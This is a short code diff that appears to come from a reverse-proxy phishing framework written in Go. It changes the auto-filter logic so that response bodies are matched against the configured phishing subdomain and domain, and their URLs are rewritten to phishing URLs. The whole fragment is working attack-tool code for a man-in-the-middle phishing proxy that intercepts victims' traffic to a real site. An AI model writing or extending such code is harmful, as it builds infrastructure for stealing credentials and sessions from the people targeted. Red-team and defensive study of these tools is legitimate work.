@@ -3537,8 +3537,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 						// handle auto filters (if enabled)
 						if stringExists(mime, p.auto_filter_mimes) {
+							phishDomain, _ := p.cfg.GetSiteDomain(pl.Name)
 							for _, ph := range pl.proxyHosts {
-								if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
+								if req_hostname == combineHost(ph.phish_subdomain, phishDomain) {
 									if ph.auto_filter {
 										body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
 									}
